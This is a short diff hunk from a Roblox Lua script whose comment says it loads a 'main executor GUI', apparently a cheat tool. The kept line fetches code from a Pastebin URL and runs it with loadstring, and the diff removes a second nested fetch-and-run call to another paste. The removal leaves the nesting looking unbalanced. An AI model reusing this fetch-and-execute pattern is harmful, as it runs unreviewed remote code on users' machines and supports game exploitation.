@@ -108,8 +108,5 @@ task.spawn(function()
 	-- Load main executor GUI
 	pcall(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/76S8gM28"))()
-        
-        pcall(function()
-                 loadstring(game:HttpGet("https://pastebin.com/raw/gk0eFguz"))()
 	end)
 end)
